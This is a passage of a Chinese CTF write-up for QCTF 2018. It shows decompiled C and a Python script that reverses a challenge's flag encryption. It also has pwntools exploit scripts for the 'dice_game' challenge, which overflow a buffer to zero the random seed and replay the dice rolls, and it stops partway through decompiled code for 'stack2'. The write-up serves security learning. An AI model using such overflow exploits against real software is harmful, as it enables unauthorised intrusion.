class="keyword">char</span> buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'\n'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf + <span class="number">35</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'!'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'"'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf + <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'\''</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">','</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'.'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">':'</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">';'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">21</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'?'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">27</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'_'</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">49</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> ( buf &lt;= <span class="string">'/'</span> || buf &gt; <span class="string">'9'</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( buf &lt;= <span class="string">'@'</span> || buf &gt; <span class="string">'Z'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( buf &gt; <span class="string">'`'</span> &amp;&amp; buf &lt;= <span class="string">'z'</span> )</span><br><span class="line">            result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">87</span>);  <span class="comment">// lower case</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">55</span>);    <span class="comment">// upper case</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(buf - <span class="number">48</span>);      <span class="comment">// number</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是对flag的加密部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input, <span class="keyword">char</span> *girl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> enc[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">    enc[i] = *(_DWORD *)&amp;girl[<span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)convert(input[i])];</span><br><span class="line">  index_round(enc);</span><br><span class="line">  shift(enc, len);</span><br><span class="line">  output(enc, <span class="string">"out"</span>, len);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里用到了一个global的table，和之前的词频一样，通过打表将映射关系记录下来：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">index_round</span><span class="params">(<span class="keyword">char</span> *enc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v2[<span class="number">5</span>]; <span class="comment">// [rsp+13h] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">4</span>] = <span class="number">0</span>;                                    <span class="comment">// v2[1] = 0;</span></span><br><span class="line">  *(_DWORD *)v2 = (<span class="keyword">unsigned</span> __int8)*enc;</span><br><span class="line">  <span class="keyword">while</span> ( table[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] )</span><br><span class="line">  &#123;</span><br><span class="line">    enc[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] = enc[table[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]]];</span><br><span class="line">    *(_DWORD *)&amp;v2[<span class="number">1</span>] = table[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]];</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2[<span class="number">0</span>];</span><br><span class="line">  enc[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] = v2[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>shift()</code>做了一个循环位移，这个操作显然是可逆的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">shift</span><span class="params">(<span class="keyword">char</span> *enc, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+17h] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">unsigned</span> __int8)*enc &gt;&gt; <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; len - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">    enc[i] = <span class="number">8</span> * enc[i] | ((<span class="keyword">unsigned</span> __int8)enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">  result = &amp;enc[i];</span><br><span class="line">  *result = <span class="number">8</span> * *result | v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>output()</code>函数将密文输出到<code>out</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">output</span><span class="params">(<span class="keyword">char</span> *enc, <span class="keyword">const</span> <span class="keyword">char</span> *file, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = len;</span><br><span class="line">  fd = open(file, <span class="number">65</span>, <span class="number">438L</span>L);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    write(fd, &amp;enc[i], <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总体加密过程统计了that_girl文件的词频, 并将flag转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">f = open(<span class="string">'out'</span>, <span class="string">'rb'</span>)</span><br><span class="line">t = f.read()</span><br><span class="line">f.close()</span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(t)):</span><br><span class="line">    enc.append(ord(t[i]))</span><br><span class="line"><span class="keyword">print</span> enc</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(c)</span>:</span></span><br><span class="line">    res = c - <span class="number">10</span></span><br><span class="line">    <span class="keyword">if</span> c == <span class="number">10</span>:</span><br><span class="line">        res = c + <span class="number">35</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">32</span> &lt;= c &lt;= <span class="number">34</span>:</span><br><span class="line">        res = c + <span class="number">10</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">39</span>:</span><br><span class="line">        res = c + <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">44</span>:</span><br><span class="line">        res = c - <span class="number">4</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">46</span>:</span><br><span class="line">        res = c - <span class="number">7</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="number">58</span> &lt;= c &lt;= <span class="number">59</span>:</span><br><span class="line">        res = c - <span class="number">21</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">63</span>:</span><br><span class="line">        res = c - <span class="number">27</span></span><br><span class="line">    <span class="keyword">elif</span> c == <span class="number">95</span>:</span><br><span class="line">        res = c - <span class="number">49</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> c &lt;= <span class="number">47</span> <span class="keyword">or</span> c &gt; <span class="number">57</span>:</span><br><span class="line">            <span class="keyword">if</span> c &lt;= <span class="number">64</span> <span class="keyword">or</span> c &gt; <span class="number">90</span>:</span><br><span class="line">                <span class="keyword">if</span> c &gt; <span class="number">96</span> <span class="keyword">and</span> c &lt;= <span class="number">122</span>:</span><br><span class="line">                    res = c - <span class="number">87</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res = c - <span class="number">55</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res = c - <span class="number">48</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert1</span></span><br><span class="line">convert_map = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    convert_map[convert(ch)] = ch</span><br><span class="line"><span class="comment"># print convert_map</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'that_girl'</span>, <span class="string">'rb'</span>)</span><br><span class="line">that_girl = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># print that_girl</span></span><br><span class="line"></span><br><span class="line">girl = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(that_girl)):</span><br><span class="line">    t = convert(that_girl[i])</span><br><span class="line">    girl[t * <span class="number">4</span>] += <span class="number">1</span></span><br><span class="line"><span class="comment"># print girl</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shift</span></span><br><span class="line">enc1 = []</span><br><span class="line">enc1.append(((enc[<span class="number">-1</span>] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xff</span>) | (enc[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc) - <span class="number">1</span>):</span><br><span class="line">    enc1.append(((enc[i] &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xff</span>) | (enc[i + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>))</span><br><span class="line"><span class="keyword">print</span> len(enc1)</span><br><span class="line"></span><br><span class="line">table = [<span class="number">0x00000016</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000002</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000018</span>, <span class="number">0x00000009</span>, <span class="number">0x00000001</span>, <span class="number">0x00000015</span>, <span class="number">0x00000007</span>, <span class="number">0x00000012</span>, <span class="number">0x0000000A</span>, <span class="number">0x00000008</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000011</span>, <span class="number">0x00000017</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x0000000E</span>, <span class="number">0x00000013</span>, <span class="number">0x0000000B</span>, <span class="number">0x00000014</span>, <span class="number">0x00000010</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000005</span>, <span class="number">0x00000019</span>, <span class="number">0x00000024</span>, <span class="number">0x0000001B</span>, <span class="number">0x0000001C</span>, <span class="number">0x0000001D</span>, <span class="number">0x00000025</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000020</span>, <span class="number">0x00000021</span>, <span class="number">0x0000001A</span>, <span class="number">0x00000022</span>, <span class="number">0x00000023</span>]</span><br><span class="line"><span class="keyword">print</span> len(table)</span><br><span class="line"></span><br><span class="line"><span class="comment"># convert2</span></span><br><span class="line">round_map = &#123;&#125;</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> table[x] != <span class="number">0</span>:</span><br><span class="line">    round_map[table[x]] = x</span><br><span class="line">    x = table[x]</span><br><span class="line">round_map[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> round_map</span><br><span class="line"></span><br><span class="line">enc2 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc1))]</span><br><span class="line"><span class="keyword">for</span> origin, encoded <span class="keyword">in</span> round_map.items():</span><br><span class="line">    enc2[origin] = enc1[encoded]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(girl) / <span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> enc2[i] == girl[j * <span class="number">4</span>]:</span><br><span class="line">            flag += chr(convert_map[j])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag: QCTF&#123;%s&#125;'</span> % flag</span><br></pre></td></tr></table></figure>
<h2 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Xman-dice-game"><a href="#Xman-dice-game" class="headerlink" title="Xman-dice_game"></a>Xman-dice_game</h2><p>放进ida看main函数：</p>
<p><img src="/pics/2018-QCTF-writeup/15.png" alt="main函数内容"></p>
<p>buf存在溢出，可以覆盖到seed，使之为0。想法就是通过爆破得到随机数的顺序。脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(ans)</span>:</span></span><br><span class="line">	p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line">	<span class="comment"># p = remote("47.96.239.28", 9999)</span></span><br><span class="line">	p.readuntil(<span class="string">"name:"</span>)</span><br><span class="line">	payload = p64(<span class="number">0xabcdabcdabcdabcd</span>) * <span class="number">8</span> + p64(<span class="number">0</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	ans_len = len(ans)</span><br><span class="line">	log.success(ans)</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">while</span> i &lt; ans_len:</span><br><span class="line">			p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">			n = ans[i]</span><br><span class="line">			i += <span class="number">1</span></span><br><span class="line">			p.sendline(n)</span><br><span class="line">		random.seed(time.time())</span><br><span class="line">		n = str(int(random.randint(<span class="number">1</span>, <span class="number">6</span>)))</span><br><span class="line">		p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">		p.sendline(n)</span><br><span class="line">		print(n)</span><br><span class="line">		sub = p.readuntil(<span class="string">'.'</span>)</span><br><span class="line">		log.info(sub)</span><br><span class="line">		<span class="keyword">return</span> sub, n</span><br><span class="line"></span><br><span class="line">ans = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span> len(ans) == <span class="number">50</span>:</span><br><span class="line">		print(ans)			</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	res, n = test(ans)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"win"</span> <span class="keyword">in</span> res:</span><br><span class="line">		ans += n</span><br></pre></td></tr></table></figure>
<p>通过得到的顺序作为payload，脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./dice_game'</span>)</span><br><span class="line"><span class="comment"># p = remote("47.96.239.28", 9999)</span></span><br><span class="line">p.readuntil(<span class="string">"name:"</span>)</span><br><span class="line">payload = p64(<span class="number">0x1122334455667788</span>) * <span class="number">8</span> + p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">ans = <span class="string">"25426251423232651155634433322261116425254446323361"</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">50</span>:</span><br><span class="line">	p.readuntil(<span class="string">"nt(1~6): "</span>)</span><br><span class="line">	n = ans[i]</span><br><span class="line">	i += <span class="number">1</span></span><br><span class="line">	p.sendline(n)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/pics/2018-QCTF-writeup/16.png" alt="得到flag"></p>
<h2 id="Xan-stack2"><a href="#Xan-stack2" class="headerlink" title="Xan-stack2"></a>Xan-stack2</h2><p>感觉这应该算是一道比较好的栈溢出的题。<code>checksec</code>发现PIE没开，Canary和NX都开了。</p>
<p><img src="/pics/2018-QCTF-writeup/17.png" alt="PIE没有开"></p>
<p>拖进ida后f5：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+18h] [ebp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> k; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> l; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">char</span> v13[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v14; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*                      An easy calc                       *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*Give me your numbers and I will return to you an average *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*(0 &lt;= x &lt; 256)                                           *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***********************************************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How many numbers you have:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Give me your numbers"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 &amp;&amp; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">99</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">    v13[i] = v7;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = v5; ; <span class="built_in">printf</span>(<span class="string">"average is %.2lf\n"</span>, (<span class="keyword">double</span>)((<span class="keyword">long</span> <span class="keyword">double</span>)v9 / (<span class="keyword">double</span>)j)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> 